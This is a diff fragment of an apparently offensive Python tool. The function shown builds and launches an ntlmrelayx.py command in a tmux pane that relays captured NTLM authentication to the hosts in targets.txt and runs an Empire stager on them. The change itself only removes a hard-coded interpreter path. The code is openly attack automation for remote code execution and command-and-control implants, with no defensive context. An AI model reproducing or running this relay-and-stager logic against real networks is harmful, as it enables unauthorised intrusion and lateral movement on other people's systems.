@@ -112,7 +112,7 @@ def main():
     print("Stager: " + empire_stager)
     
     if not disable_relay:
-        command = "python /usr/local/bin/ntlmrelayx.py -smb2support -tf targets.txt -c '" + empire_stager + "'"
+        command = "ntlmrelayx.py -smb2support -tf targets.txt -c '" + empire_stager + "'"
         #tmux_window.split_window(shell=command)
         tmux_pane = tmux_window.split_window()
         tmux_pane.send_keys(command)
